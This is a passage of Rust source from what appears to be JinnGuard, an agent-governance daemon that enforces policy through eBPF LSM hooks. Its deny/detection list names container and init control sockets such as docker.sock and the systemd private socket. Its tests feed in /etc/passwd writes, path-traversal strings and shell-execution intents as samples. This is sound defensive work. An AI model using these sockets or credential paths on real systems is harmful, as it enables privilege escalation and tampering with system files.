                    &agent_key,
                    &observation,
                    proposal.sequence_counter,
                    &assessment,
                    quota_reserved,
                );
            }
            let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &deny_decision);
            return;
        }

        let broker_result = if current_policy.runtime_policy.require_brokered_execution
            && execute_requested
            && proposal.proposed_action.is_some()
        {
            Some(execute_broker_action(&execution_decision.action))
        } else {
            None
        };

        // STEP 14: Response.
        let response = if execution_decision.constrained || decision.is_constrain() {
            let constraints_json = decision
                .constraints
                .as_ref()
                .and_then(|c| serde_json::to_string(c).ok())
                .unwrap_or_else(|| "{}".to_string());
            if let Some(result) = broker_result {
                format!("SIGNAL: CONSTRAIN\n{constraints_json}\n{result}\n")
            } else {
                format!("SIGNAL: CONSTRAIN\n{constraints_json}\n")
            }
        } else if let Some(result) = broker_result {
            format!("SIGNAL: ALLOW\n{result}\n")
        } else {
            "SIGNAL: ALLOW\n".to_string()
        };
        let _ = write_framed_response(&mut stream, 1, response.as_bytes()).await;
        emit_policy_decision_explanation(
            &decision,
            &peer_source,
            &proposal,
            agent_id_opt.as_deref(),
            &assessment,
        );

        // STEP 15: Update lineage decisions_seen and state.
        {
            let mut reg = registry_store.lock().unwrap();
            update_lineage_after_decision(
                &mut reg,
                &agent_key,
                &observation,
                proposal.sequence_counter,
                &assessment,
                quota_reserved,
            );
        }

        // STEP 16: Write audit log entry.
        let _ = audit_logger.log(&observation, &semantic_intent, &assessment, &decision);
    }
}

fn lineage_placeholder_assessment(reason: &str) -> RiskAssessment {
    RiskAssessment {
        observed_risk: 0.0,
        semantic_risk: 0.0,
        topology_risk: 0.0,
        declared_risk: None,
        fused_risk: 0.0,
        trust_score: 100.0,
        reasons: vec![reason.to_string()],
    }
}

fn reserve_lineage_sequence(
    reg: &mut LineageRegistry,
    lineage_key: &str,
    observation: &ObservationRecord,
    sequence: u64,
) -> Result<(), String> {
    let placeholder_assessment = lineage_placeholder_assessment("sequence_placeholder_assessment");
    let lineage = reg
        .data
        .lineages
        .entry(lineage_key.to_string())
        .or_insert_with(|| AgentLineage::new(observation, sequence, &placeholder_assessment));

    lineage
        .validate_sequence(sequence)
        .map_err(|err| err.to_string())?;
    lineage.last_seen_unix_secs = observation.observed_at_unix_secs;
    lineage.last_sequence = sequence;
    let _ = reg.save();
    Ok(())
}

fn update_lineage_after_decision(
    reg: &mut LineageRegistry,
    lineage_key: &str,
    observation: &ObservationRecord,
    sequence: u64,
    assessment: &RiskAssessment,
    quota_reserved: bool,
) {
    let lineage = reg
        .data
        .lineages
        .entry(lineage_key.to_string())
        .or_insert_with(|| AgentLineage::new(observation, sequence, assessment));

    lineage.last_seen_unix_secs = observation.observed_at_unix_secs;
    lineage.last_sequence = sequence;
    lineage.max_assessed_risk = f64::max(lineage.max_assessed_risk, assessment.fused_risk);
    if !quota_reserved {
        lineage.decisions_seen += 1;
    }
    let _ = reg.save();
}

// ---------------------------------------------------------------------------
// observed_risk_penalty — used by mcp_gateway
// ---------------------------------------------------------------------------

pub(crate) fn observed_risk_penalty(events: &[KernelTelemetryEvent]) -> f64 {
    events
        .iter()
        .fold(0.0, |acc, e| if e.denied { acc + 10.0 } else { acc + 1.0 })
}

// ---------------------------------------------------------------------------
// Z3 policy invariants
// ---------------------------------------------------------------------------

fn verify_z3_policy_invariants(
    agent_node: Option<&AgentNodePolicy>,
    proposal: &ClientProposal,
    assessment: &RiskAssessment,
    capability_profile: &CapabilityProfile,
) -> Result<()> {
    let Some(agent_node) = agent_node else {
        return Ok(());
    };
    if agent_node.invariants.is_empty() {
        return Ok(());
    }

    let mut context_vars = proposal.context_vars.clone();
    context_vars
        .entry("observed_risk".to_string())
        .or_insert(assessment.observed_risk);
    context_vars
        .entry("semantic_risk".to_string())
        .or_insert(assessment.semantic_risk);
    context_vars
        .entry("topology_risk".to_string())
        .or_insert(assessment.topology_risk);
    context_vars
        .entry("fused_risk".to_string())
        .or_insert(assessment.fused_risk);
    context_vars
        .entry("trust_score".to_string())
        .or_insert(assessment.trust_score);
    context_vars
        .entry("privilege_tier".to_string())
        .or_insert(agent_node.privilege_tier as f64);
    context_vars
        .entry("is_root".to_string())
        .or_insert(if capability_profile.is_root { 1.0 } else { 0.0 });
    if let Some(declared) = assessment.declared_risk {
        context_vars
            .entry("declared_risk".to_string())
            .or_insert(declared);
    }
    if let Some(action_risk) = proposal.action_risk_score {
        context_vars
            .entry("action_risk_score".to_string())
            .or_insert(action_risk);
    }

    let config = Z3Config::new();
    let context = Z3Context::new(&config);
    let engine = PolicyEngine::new(&context);
    engine.verify_policy_invariants(&agent_node.invariants, &context_vars)
}

// ---------------------------------------------------------------------------
// eBPF LSM verdict path
// ---------------------------------------------------------------------------

fn env_flag_enabled(name: &str) -> bool {
    env_flag_value(name).unwrap_or(false)
}

fn env_flag_value(name: &str) -> Option<bool> {
    std::env::var(name)
        .map(|value| {
            let value = value.trim();
            value == "1"
                || value.eq_ignore_ascii_case("true")
                || value.eq_ignore_ascii_case("yes")
                || value.eq_ignore_ascii_case("on")
        })
        .ok()
}

fn enterprise_kernel_telemetry_required() -> bool {
    env_flag_enabled("JINNGUARD_ENTERPRISE")
}

fn jinnguard_safe_mode_enabled() -> bool {
    env_flag_value("JINNGUARD_SAFE_MODE").unwrap_or_else(|| {
        if enterprise_kernel_telemetry_required() {
            false
        } else {
            eprintln!(
                "[startup] JINNGUARD_SAFE_MODE unset; local development default is audit-only"
            );
            true
        }
    })
}

#[cfg(feature = "kernel_telemetry")]
fn start_lsm_verdict_loop(
    active_policy: Arc<Mutex<PolicyConfig>>,
    telemetry_store: TelemetryStore,
    socket_path: &str,
) -> Result<()> {
    let enterprise_required = enterprise_kernel_telemetry_required();
    let safe_mode = jinnguard_safe_mode_enabled();
    let mut monitor = match ebpf_monitor::aya_backend::AyaLsmMonitor::load(safe_mode) {
        Ok(monitor) => monitor,
        Err(err) if enterprise_required => {
            return Err(anyhow::anyhow!(
                "fail-closed: enterprise startup requires kernel_telemetry, but AyaLsmMonitor::load() failed: {err}"
            ));
        }
        Err(err) => {
            eprintln!(
                "[eBPF LSM] kernel telemetry unavailable; continuing in userspace-only mode: {err}"
            );
            return Ok(());
        }
    };

    let policy_snapshot = active_policy.lock().unwrap().clone();
    monitor
        .configure_policy(&policy_snapshot, safe_mode, socket_path)
        .map_err(|err| {
            anyhow::anyhow!("fail-closed: failed to configure in-kernel LSM policy maps: {err}")
        })?;

    // Attach the hooks ONLY now that the in-kernel deny maps are fully populated.
    // Attaching before this point would leave a window in which a live hook
    // consults an empty policy map and fails OPEN. See THREAT_MODEL.md
    // (load-window fail-open) and AyaLsmMonitor::attach_all.
    monitor.attach_all().map_err(|err| {
        anyhow::anyhow!("fail-closed: failed to attach LSM hooks after policy load: {err}")
    })?;

    // LSM programs are now loaded, configured, and attached. Optionally shed the
    // privileges we no longer need (opt-in; never breaks enforcement).
    if capability_hardening::enabled() {
        capability_hardening::apply();
    }

    thread::Builder::new()
        .name("jinn-lsm-verdict-loop".to_string())
        .spawn(move || run_lsm_verdict_loop(monitor, active_policy, telemetry_store, safe_mode))
        .map_err(|err| anyhow::anyhow!("failed to spawn LSM verdict loop: {err}"))?;
    println!("[eBPF LSM] Dedicated request/verdict loop started.");
    Ok(())
}

#[cfg(not(feature = "kernel_telemetry"))]
fn start_lsm_verdict_loop(
    _active_policy: Arc<Mutex<PolicyConfig>>,
    _telemetry_store: TelemetryStore,
    _socket_path: &str,
) -> Result<()> {
    if enterprise_kernel_telemetry_required() {
        return Err(anyhow::anyhow!(
            "fail-closed: enterprise startup requires the kernel_telemetry feature"
        ));
    }
    Ok(())
}

#[cfg(feature = "kernel_telemetry")]
fn run_lsm_verdict_loop(
    mut monitor: ebpf_monitor::aya_backend::AyaLsmMonitor,
    active_policy: Arc<Mutex<PolicyConfig>>,
    telemetry_store: TelemetryStore,
    safe_mode: bool,
) {
    let path_cache = LsmPathResolutionCache::new();
    loop {
        let requests = match monitor.poll_requests() {
            Ok(requests) => requests,
            Err(err) => {
                eprintln!("[eBPF LSM] request poll failed; kernel hooks remain fail-closed on timeout: {err}");
                thread::sleep(Duration::from_millis(10));
                continue;
            }
        };

        if requests.is_empty() {
            thread::sleep(Duration::from_millis(2));
            continue;
        }

        for mut request in requests {
            path_cache.resolve_request(&mut request);
            let policy_snapshot = active_policy.lock().unwrap().clone();
            let verdict = lsm_policy_verdict(&request, &policy_snapshot, safe_mode);
            let denied = matches!(verdict, Verdict::Deny);
            metrics::record_kernel_decision(denied);
            emit_lsm_decision_explanation(&request, verdict);
            // #58: surface confused-deputy attempts (governed connect to an
            // orchestrator/init control socket) for operator visibility. Detection
            // only; the enforcement decision already happened above and in-kernel.
            if let Some(alert) = classify_deputy_connect(&request, verdict) {
                alert.report();
            }

            {
                let mut store = telemetry_store.lock().unwrap();
                store
                    .entry(request.pid)
                    .or_default()
                    .push(KernelTelemetryEvent {
                        event_type: format!("{:?}", request.req_type),
                        resource: request.effective_path().to_string(),
                        denied,
                    });
            }

            if let Err(err) = monitor.send_verdict(request.cookie, verdict) {
                eprintln!(
                    "[eBPF LSM] failed to write verdict for cookie={}: {}; verdict telemetry map update failed; enforcement decision is made in-kernel from policy maps",
                    request.cookie, err
                );
            }
        }
    }
}

#[cfg(feature = "kernel_telemetry")]
fn lsm_policy_verdict(request: &LsmRequest, policy: &PolicyConfig, safe_mode: bool) -> Verdict {
    let origin_verdict = if safe_mode {
        None
    } else {
        lsm_origin_gate_verdict(request)
    };
    let observation =
        explainability::observe_lsm_request(request, safe_mode || origin_verdict.is_none());

    if safe_mode {
        return Verdict::Allow;
    }

    if let Some(verdict) = origin_verdict {
        return verdict;
    }

    if observation.trust.0 < 0.5 {
        println!(
            "[JINNGUARD LOW TRUST] pid={} trust={}",
            request.pid, observation.trust.0
        );
    }

    if observation.risk == explainability::IntentRiskLevel::High {
        println!(
            "[JINNGUARD INTENT RISK] pid={} risk={:?} pattern={:?}",
            request.pid, observation.risk, observation.pattern
        );
    }

    if let Some(verdict) = lsm_intent_response_verdict(request, &observation.risk) {
        return verdict;
    }

    match request.req_type {
        LsmRequestType::Connect | LsmRequestType::SendMsg => {
            lsm_network_verdict(request, &policy.network_policy)
        }
        LsmRequestType::Execve => lsm_exec_verdict(request, policy),
        LsmRequestType::InodeCreate => lsm_path_denylist_verdict(
            request,
            policy,
            explainability::DenyReason::WriteNotAllowed,
            |node| &node.denied_write_paths,
        ),
        LsmRequestType::InodeUnlink => lsm_path_denylist_verdict(
            request,
            policy,
            explainability::DenyReason::WriteNotAllowed,
            |node| &node.denied_unlink_paths,
        ),
    }
}

#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn lsm_origin_gate_verdict(request: &LsmRequest) -> Option<Verdict> {
    let resource_path = request.effective_path();

    if is_protected_system_path(resource_path) {
        return Some(explainability::explain_deny(
            request,
            explainability::DenyReason::ProtectedSystemPath,
        ));
    }

    if is_trusted_process(request) {
        return Some(Verdict::Allow);
    }

    if request.is_interactive {
        return Some(Verdict::Allow);
    }

    if !path_is_governed(resource_path) {
        return Some(Verdict::Allow);
    }

    None
}

#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn lsm_intent_response_verdict(
    request: &LsmRequest,
    risk: &explainability::IntentRiskLevel,
) -> Option<Verdict> {
    if *risk == explainability::IntentRiskLevel::High
        && path_is_governed(request.effective_path())
        && explainability::is_agent_escalated(&explainability::compute_agent_identity(request))
    {
        return Some(explainability::explain_deny(
            request,
            explainability::DenyReason::PolicyViolation,
        ));
    }

    None
}

/// #58 — orchestrator/init control sockets whose connect, from a *governed*
/// agent, is a confused-deputy signal: the agent is reaching for a daemon that
/// holds ungoverned root authority (container runtimes, libvirt, the system
/// D-Bus, the systemd private socket). This is the user-space *detection* mirror
/// of the in-kernel denylist (#55, `ORCHESTRATOR_CONTROL_SOCKETS` in
/// `ebpf_monitor.rs`); the two lists must stay in sync — the
/// `deputy_socket_paths_match_kernel_denylist` test pins that.
const ORCHESTRATOR_CONTROL_SOCKETS: &[(&str, &str)] = &[
    ("/run/docker.sock", "docker"),
    ("/var/run/docker.sock", "docker"),
    ("/run/containerd/containerd.sock", "containerd"),
    ("/var/run/containerd/containerd.sock", "containerd"),
    ("/run/podman/podman.sock", "podman"),
    ("/var/run/podman/podman.sock", "podman"),
    ("/run/crio/crio.sock", "crio"),
    ("/var/run/crio/crio.sock", "crio"),
    ("/run/libvirt/libvirt-sock", "libvirt"),
    ("/var/run/libvirt/libvirt-sock", "libvirt"),
    ("/run/libvirt/libvirt-sock-ro", "libvirt"),
    ("/var/run/libvirt/libvirt-sock-ro", "libvirt"),
    ("/run/dbus/system_bus_socket", "dbus"),
    ("/var/run/dbus/system_bus_socket", "dbus"),
    ("/run/systemd/private", "systemd"),
    ("/var/run/systemd/private", "systemd"),
];

/// Return the orchestrator label if `path` is a known orchestrator/init control
/// socket, else `None`. Exact pathname match (mirrors the in-kernel denylist);
/// an abstract-namespace socket reads as "" and never matches.
#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn orchestrator_control_socket(path: &str) -> Option<&'static str> {
    ORCHESTRATOR_CONTROL_SOCKETS
        .iter()
        .find(|(socket, _)| *socket == path)
        .map(|(_, label)| *label)
}

/// A governed agent's attempt to reach an orchestrator/init control socket.
/// Surfaced for operator visibility regardless of the verdict — an `allow` is
/// the louder signal, since it means a confused-deputy path is still open.
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
struct DeputyConnectAlert {
    orchestrator: &'static str,
    socket: String,
    denied: bool,
    pid: u32,
    process: Option<String>,
}

#[allow(dead_code)]
impl DeputyConnectAlert {
    /// Emit the operator-facing detection signal: a single greppable log line
    /// plus a Prometheus counter increment. Detection only — the enforcement
    /// decision is the kernel denylist's (#55); this never changes the verdict.
    fn report(&self) {
        println!(
            "[JINNGUARD DEPUTY ALERT] pid={} orchestrator={} socket={} verdict={} process={}",
            self.pid,
            self.orchestrator,
            self.socket,
            if self.denied { "DENY" } else { "ALLOW" },
            self.process.as_deref().unwrap_or("?"),
        );
        metrics::record_orchestrator_socket_attempt(self.orchestrator, self.denied);
    }
}

/// Classify a resolved LSM request as a deputy-socket connect attempt, if it is
/// one. Only AF_UNIX `Connect` requests to a known orchestrator socket qualify;
/// everything else (IP connects, execs, inode ops, ordinary unix sockets)
/// returns `None`.
#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn classify_deputy_connect(request: &LsmRequest, verdict: Verdict) -> Option<DeputyConnectAlert> {
    if request.req_type != LsmRequestType::Connect {
        return None;
    }
    if request.family as i32 != libc::AF_UNIX {
        return None;
    }
    let socket = request.effective_path();
    let orchestrator = orchestrator_control_socket(socket)?;
    Some(DeputyConnectAlert {
        orchestrator,
        socket: socket.to_string(),
        denied: matches!(verdict, Verdict::Deny),
        pid: request.pid,
        process: request.process_path.clone(),
    })
}

#[cfg(test)]
mod framed_io_tests {
    use super::{read_exact_with_timeout, TimedReadError};
    use std::time::Duration;
    use tokio::io::AsyncWriteExt;

    #[tokio::test]
    async fn uds_frame_read_times_out_on_partial_header() {
        let (mut client, mut server) = tokio::io::duplex(8);
        client
            .write_all(&[0, 0])
            .await
            .expect("write partial header");

        let mut header = [0u8; 5];
        let err = read_exact_with_timeout(&mut server, &mut header, Duration::from_millis(10))
            .await
            .expect_err("partial header should time out");
        assert!(matches!(err, TimedReadError::TimedOut), "got: {err:?}");
    }
}

#[cfg(test)]
mod deputy_detection_tests {
    use super::*;

    fn unix_connect(resource: &str) -> LsmRequest {
        LsmRequest {
            cookie: 7,
            pid: 4242,
            req_type: LsmRequestType::Connect,
            source_program: 0,
            family: libc::AF_UNIX as u16,
            tty: None,
            is_interactive: false,
            process_path: Some("/usr/bin/agent".to_string()),
            resource: resource.to_string(),
            resolved_path: None,
            payload_preview: vec![],
        }
    }

    #[test]
    fn orchestrator_sockets_classify_to_their_label() {
        assert_eq!(
            orchestrator_control_socket("/run/docker.sock"),
            Some("docker")
        );
        // /var/run is a symlink to /run on most distros, but an agent may use
        // either literal path, so both are listed.
        assert_eq!(
            orchestrator_control_socket("/var/run/docker.sock"),
            Some("docker")
        );
        assert_eq!(
            orchestrator_control_socket("/run/containerd/containerd.sock"),
            Some("containerd")
        );
        assert_eq!(
            orchestrator_control_socket("/run/libvirt/libvirt-sock-ro"),
            Some("libvirt")
        );
        assert_eq!(
            orchestrator_control_socket("/run/dbus/system_bus_socket"),
            Some("dbus")
        );
        assert_eq!(
            orchestrator_control_socket("/run/systemd/private"),
            Some("systemd")
        );
    }

    #[test]
    fn non_orchestrator_paths_do_not_classify() {
        // Ordinary application sockets, the empty abstract-namespace read, and an
        // IP-style connect resource must all be ignored.
        assert_eq!(orchestrator_control_socket("/tmp/app.sock"), None);
        assert_eq!(orchestrator_control_socket("/run/myapp/app.sock"), None);
        assert_eq!(orchestrator_control_socket(""), None);
        assert_eq!(orchestrator_control_socket("10.0.0.1:80"), None);
        // A path that merely contains a known socket name but is not an exact
        // match must not classify (exact-match semantics, mirroring the kernel).
        assert_eq!(orchestrator_control_socket("/run/docker.sock.evil"), None);
        assert_eq!(orchestrator_control_socket("/home/x/run/docker.sock"), None);
    }

    #[test]
    fn classify_flags_denied_and_allowed_attempts() {
        let denied = classify_deputy_connect(&unix_connect("/run/docker.sock"), Verdict::Deny)
            .expect("docker connect must classify");
        assert_eq!(denied.orchestrator, "docker");
        assert_eq!(denied.socket, "/run/docker.sock");
        assert!(denied.denied);
        assert_eq!(denied.pid, 4242);
        assert_eq!(denied.process.as_deref(), Some("/usr/bin/agent"));

        // An ALLOW outcome is still reported — it is the louder signal (the
        // confused-deputy path was open).
        let allowed =
            classify_deputy_connect(&unix_connect("/run/podman/podman.sock"), Verdict::Allow)
                .expect("podman connect must classify");
        assert_eq!(allowed.orchestrator, "podman");
        assert!(!allowed.denied);
    }

    #[test]
    fn ordinary_unix_connect_is_not_a_deputy_alert() {
        assert!(classify_deputy_connect(&unix_connect("/tmp/app.sock"), Verdict::Allow).is_none());
    }

    #[test]
    fn non_unix_connect_is_not_a_deputy_alert() {
        // Same destination string but AF_INET — not a unix-socket connect.
        let mut req = unix_connect("/run/docker.sock");
        req.family = libc::AF_INET as u16;
        assert!(classify_deputy_connect(&req, Verdict::Deny).is_none());
    }

    #[test]
    fn non_connect_request_is_not_a_deputy_alert() {
        // An execve whose resource happens to look like a socket path must not be
        // misread as a connect attempt.
        let mut req = unix_connect("/run/docker.sock");
        req.req_type = LsmRequestType::Execve;
        assert!(classify_deputy_connect(&req, Verdict::Deny).is_none());
    }

    #[test]
    fn every_listed_socket_classifies_to_a_known_label() {
        // Pins the detection list to the kernel denylist's shape (#55,
        // ORCHESTRATOR_CONTROL_SOCKETS in ebpf_monitor.rs): exactly these labels,
        // every entry resolvable. If the kernel list changes, update both.
        let mut labels: Vec<&str> = ORCHESTRATOR_CONTROL_SOCKETS
            .iter()
            .map(|(path, label)| {
                assert_eq!(
                    orchestrator_control_socket(path),
                    Some(*label),
                    "listed socket {path} must classify to {label}"
                );
                *label
            })
            .collect();
        labels.sort_unstable();
        labels.dedup();
        assert_eq!(
            labels,
            [
                "containerd",
                "crio",
                "dbus",
                "docker",
                "libvirt",
                "podman",
                "systemd"
            ]
        );
    }

    #[test]
    fn report_increments_metric_with_labels() {
        let alert = classify_deputy_connect(&unix_connect("/run/crio/crio.sock"), Verdict::Deny)
            .expect("crio connect must classify");
        alert.report();
        let rendered = metrics::render();
        assert!(
            rendered.contains(
                "jinnguard_orchestrator_socket_attempts_total{orchestrator=\"crio\",verdict=\"deny\"}"
            ),
            "metric line missing from render:\n{rendered}"
        );
    }
}

#[cfg(feature = "kernel_telemetry")]
fn lsm_network_verdict(request: &LsmRequest, policy: &NetworkPolicy) -> Verdict {
    let resource = request.effective_path();
    if request.family as i32 == libc::AF_UNIX {
        if policy.unix_default_deny
            && !policy
                .allowed_unix_sockets
                .iter()
                .any(|allowed| resource == allowed)
        {
            return explainability::explain_deny(
                request,
                explainability::DenyReason::PolicyViolation,
            );
        }
        return Verdict::Allow;
    }

    let resource_ip = network_resource_ip(resource);
    if matches_network_entry(resource, resource_ip, &policy.denied_ips) {
        return explainability::explain_deny(request, explainability::DenyReason::PolicyViolation);
    }
    if policy.default_deny && !matches_network_entry(resource, resource_ip, &policy.allowed_ips) {
        return explainability::explain_deny(request, explainability::DenyReason::PolicyViolation);
    }
    Verdict::Allow
}

#[cfg(feature = "kernel_telemetry")]
fn network_resource_ip(resource: &str) -> &str {
    if let Some(rest) = resource.strip_prefix('[') {
        return rest.split(']').next().unwrap_or(resource);
    }
    resource
        .rsplit_once(':')
        .map(|(ip, _)| ip)
        .unwrap_or(resource)
}

#[cfg(feature = "kernel_telemetry")]
fn matches_network_entry(resource: &str, ip: &str, entries: &[String]) -> bool {
    entries.iter().any(|entry| {
        let entry = entry.trim();
        !entry.is_empty()
            && (resource == entry
                || ip == entry
                || resource.starts_with(entry)
                || ip.starts_with(entry))
    })
}

#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn lsm_exec_verdict(request: &LsmRequest, policy: &PolicyConfig) -> Verdict {
    let path = request.effective_path();
    if let Some(verdict) = lsm_origin_gate_verdict(request) {
        return verdict;
    }

    if system_immunity::path_is_immune(path) {
        return Verdict::Allow;
    }

    let has_allowlist = policy
        .agent_nodes
        .values()
        .any(|node| !node.allowed_executables.is_empty());
    if has_allowlist
        && !policy
            .agent_nodes
            .values()
            .any(|node| path_matches_any(path, &node.allowed_executables))
    {
        return explainability::explain_deny(request, explainability::DenyReason::PolicyViolation);
    }
    Verdict::Allow
}

#[cfg(feature = "kernel_telemetry")]
fn lsm_path_denylist_verdict<F>(
    request: &LsmRequest,
    policy: &PolicyConfig,
    reason: explainability::DenyReason,
    denylist: F,
) -> Verdict
where
    F: Fn(&AgentNodePolicy) -> &Vec<String>,
{
    let path = request.effective_path();
    if policy
        .agent_nodes
        .values()
        .any(|node| path_matches_any(path, denylist(node)))
    {
        return explainability::explain_deny(request, reason);
    }
    Verdict::Allow
}

#[allow(dead_code)] // used by the kernel_telemetry verdict path + tests
fn path_matches_any(path: &str, patterns: &[String]) -> bool {
    patterns.iter().any(|pattern| {
        let pattern = pattern.trim();
        !pattern.is_empty() && (path == pattern || path.starts_with(pattern.trim_end_matches('/')))
    })
}

#[cfg(test)]
mod replay_guard_tests {
    use super::ReplayGuard;

    #[test]
    fn new_nonce_accepts_replay_rejects() {
        let mut g = ReplayGuard::with_capacity(8);
        assert!(g.observe(("a".to_string(), 1)), "first sight is new");
        assert!(!g.observe(("a".to_string(), 1)), "same nonce is a replay");
        assert!(g.observe(("a".to_string(), 2)), "next seq is new");
        // Per-agent namespacing: same seq, different agent, is not a replay.
        assert!(g.observe(("b".to_string(), 1)));
    }

    #[test]
    fn capacity_is_bounded_and_evicts_fifo() {
        let cap = 4;
        let mut g = ReplayGuard::with_capacity(cap);
        for seq in 0..1000u64 {
            assert!(g.observe(("agent".to_string(), seq)));
        }
        // Memory never grows past the cap, no matter how many nonces are seen.
        assert_eq!(g.len(), cap, "replay cache must stay bounded at capacity");
        // The most-recent `cap` nonces are still remembered as replays.
        assert!(!g.observe(("agent".to_string(), 999)));
        // An evicted (old) nonce is outside the window — accepted again (the
        // documented bounded-window trade-off, not unbounded memory).
        assert!(g.observe(("agent".to_string(), 0)));
    }
}

#[cfg(test)]
mod socket_startup_tests {
    use super::remove_stale_unix_socket;
    use std::io::Write;
    use std::os::unix::net::UnixListener;

    fn temp_path(name: &str) -> std::path::PathBuf {
        let mut path = std::env::temp_dir();
        path.push(format!(
            "jinnguard_socket_startup_{name}_{}",
            std::process::id()
        ));
        path
    }

    #[test]
    fn remove_stale_unix_socket_removes_only_socket_nodes() {
        let path = temp_path("sock");
        let _ = std::fs::remove_file(&path);
        let listener = UnixListener::bind(&path).unwrap();
        drop(listener);

        remove_stale_unix_socket(path.to_str().unwrap()).unwrap();

        assert!(!path.exists());
    }

    #[test]
    fn remove_stale_unix_socket_refuses_regular_file() {
        let path = temp_path("file");
        let _ = std::fs::remove_file(&path);
        let mut file = std::fs::File::create(&path).unwrap();
        file.write_all(b"do not delete").unwrap();
        drop(file);

        let err = remove_stale_unix_socket(path.to_str().unwrap())
            .unwrap_err()
            .to_string();

        assert!(err.contains("refusing to remove non-socket"), "got: {err}");
        assert!(path.exists(), "regular file must not be removed");
        let _ = std::fs::remove_file(path);
    }
}

#[cfg(test)]
mod exit_code_tests {
    use super::exit_codes;

    #[test]
    fn fatal_line_is_machine_parseable() {
        let line = exit_codes::format_fatal(
            exit_codes::EX_CONFIG,
            "SECRET_MISSING",
            "No HMAC secret. Use --secret-file",
        );
        // Stable, greppable shape: `code=<n> kind=<KIND> msg="..."`.
        assert!(line.starts_with("jinnguard: fatal "));
        assert!(line.contains("code=78"));
        assert!(line.contains("kind=SECRET_MISSING"));
        // Message is quoted (Debug) so embedded spaces don't break parsing.
        assert!(line.contains(r#"msg="No HMAC secret. Use --secret-file""#));
    }

    #[test]
    fn hardening_never_drops_a_required_capability() {
        use super::capability_hardening::{DROP_FROM_BOUNDING_SET, RETAINED_CAPS};
        for (_, drop_cap) in DROP_FROM_BOUNDING_SET {
            assert!(
                !RETAINED_CAPS.iter().any(|(_, keep)| keep == drop_cap),
                "drop list must never include a capability the daemon needs at runtime"
            );
        }
        // No duplicate cap numbers in the drop list.
        let mut nums: Vec<i32> = DROP_FROM_BOUNDING_SET.iter().map(|(_, c)| *c).collect();
        nums.sort_unstable();
        let len = nums.len();
        nums.dedup();
        assert_eq!(nums.len(), len, "drop list must not contain duplicates");
    }

    #[test]
    fn effective_retained_mask_keeps_required_drops_dangerous() {
        use super::capability_hardening::{retained_mask, DROP_FROM_BOUNDING_SET, RETAINED_CAPS};
        let mask = retained_mask();
        // Every retained capability's bit is set in the effective-set mask…
        for (name, cap) in RETAINED_CAPS {
            assert!(
                mask & (1u64 << cap) != 0,
                "retained mask must keep {name} (cap {cap}) the daemon needs at runtime"
            );
        }
        // …and every bounding-set drop is also cleared from the effective mask,
        // so a deprivileged daemon can neither hold nor re-acquire it.
        for (name, cap) in DROP_FROM_BOUNDING_SET {
            assert!(
                mask & (1u64 << cap) == 0,
                "retained mask must not keep dropped capability {name} (cap {cap})"
            );
        }
    }

    #[test]
    fn startup_failure_codes_are_distinct() {
        let codes = [
            exit_codes::EX_UNAVAILABLE,
            exit_codes::EX_SOFTWARE,
            exit_codes::EX_CONFIG,
        ];
        let mut sorted = codes.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), codes.len(), "exit codes must be distinct");
    }
}

#[cfg(test)]
mod enforcement_scope_tests {
    use super::{
        explicit_protected_resource_attack, intent_is_dangerous, is_enforcement_target,
        is_path_in_test_scope, lsm_exec_verdict, protected_resource_reference,
        requires_intent_aware_enforcement, AgentNodePolicy, ClientProposal, NetworkPolicy,
        PolicyConfig, ProposedAction, RuntimePolicy,
    };
    use crate::ebpf_monitor::{
        current_time_ms, normalize_lsm_resource_path, LsmPathResolutionCache, LsmRequest,
        LsmRequestType, Verdict,
    };
    use serde_json::json;
    use std::collections::HashMap;

    #[test]
    fn enforces_only_controlled_local_regions() {
        assert!(is_enforcement_target("/tmp/jinnguard-test/attack"));
        assert!(is_enforcement_target("/var/tmp/jinnguard-test/attack"));
        assert!(is_enforcement_target("/home/alice/jinnguard-test/attack"));

        assert!(!is_enforcement_target("/home/alice/.com.google.Chrome.tmp"));
        assert!(!is_enforcement_target("/home/alice/.bashrc"));
        assert!(!is_enforcement_target(
            "/home/alice/projects/topology-s/file"
        ));
        assert!(!is_enforcement_target("/usr/bin/clear"));
        assert!(!is_enforcement_target("/bin/bash"));
        assert!(!is_enforcement_target("/lib/systemd/systemd"));
        assert!(!is_enforcement_target("/etc/passwd"));
        assert!(!is_enforcement_target("relative/path"));
        assert!(!is_enforcement_target(""));
        assert_eq!(
            is_enforcement_target("/tmp/jinnguard-test/attack"),
            is_path_in_test_scope("/tmp/jinnguard-test/attack")
        );
    }

    #[test]
    fn detects_explicit_protected_resource_attacks() {
        let action = ProposedAction::FileWrite {
            path: "/etc/passwd".to_string(),
            contents: "evil".to_string(),
        };
        assert_eq!(
            explicit_protected_resource_attack(
                Some("write_file"),
                Some(&action),
                None,
                Some("/etc/passwd")
            ),
            Some("protected_resource_proposed_action")
        );

        let traversal = json!({
            "path": "../../../etc/passwd",
            "content": "evil"
        });
        assert_eq!(
            explicit_protected_resource_attack(
                Some("write_file"),
                None,
                Some(&traversal),
                Some("../../../etc/passwd")
            ),
            Some("protected_resource_intent")
        );
    }

    #[test]
    fn classifies_scope_and_intent_without_broad_home_enforcement() {
        assert!(protected_resource_reference("/etc/shadow"));
        assert!(protected_resource_reference("../../../etc/passwd"));
        assert!(!protected_resource_reference(
            "/home/alice/projects/topology-s/file"
        ));
        assert!(intent_is_dangerous("execute_shell"));
        assert!(intent_is_dangerous("write_file"));
        assert!(!intent_is_dangerous("read_file"));

        let proposal = ClientProposal {
            sequence_counter: 1,
            intent_name: Some("execute_shell".to_string()),
            action_risk_score: Some(5.0),
            session_privilege_bit: None,
            prompt: None,
            plan: None,
            source_code: None,
            requested_capabilities: vec![],
            proposed_action: None,
            context_vars: HashMap::new(),
        };
        assert!(requires_intent_aware_enforcement(
            &proposal,
            &json!({}),
            40.0
        ));
    }

    #[test]
    fn normalizes_lsm_resource_paths_without_panics() {
        assert_eq!(
            normalize_lsm_resource_path(std::process::id(), "/tmp/jinnguard-test/example"),
            "/tmp/jinnguard-test/example"
        );
        assert_eq!(normalize_lsm_resource_path(std::process::id(), ""), "");

        let basename = "jinnguard-normalize-basename-only";
        let normalized = normalize_lsm_resource_path(std::process::id(), basename);
        assert!(
